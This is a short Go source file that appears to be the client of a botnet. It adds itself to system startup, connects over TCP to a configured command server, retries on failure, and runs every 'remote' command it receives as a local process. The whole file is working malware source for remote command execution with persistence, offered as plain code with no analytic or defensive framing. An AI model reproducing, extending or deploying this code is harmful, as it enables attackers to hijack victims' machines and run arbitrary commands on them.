package main

import (
	. "botnet/client/util"
	"bufio"
	"encoding/json"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

var remainingRetryAttempts = Config.RetryAttempts

func RetryConnection() {
	if remainingRetryAttempts == 0 {
		os.Exit(-1)
	}

	remainingRetryAttempts -= 1
	Connect()
}

func Connect() {
	conn, err := net.Dial("tcp", Config.ServerUrl)
	if err != nil {
		time.Sleep(time.Duration(Config.RetryInterval) * time.Minute)
		RetryConnection()
		return
	}

	reader := bufio.NewReader(conn)

	for {
		payloadRaw, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		var payload map[string]interface{}
		err = json.Unmarshal([]byte(payloadRaw), &payload)
		if err != nil { continue }

		if payload["type"] == "remote" {
			command := payload["command"].(string)
			parts := strings.Fields(command)
			cmd := exec.Command(parts[0], parts[1:]...)
			err := cmd.Run()
			if err != nil { continue }
			continue
		}
	}

	RetryConnection()
}

func main() {
	AddToStartup()
	Connect()
}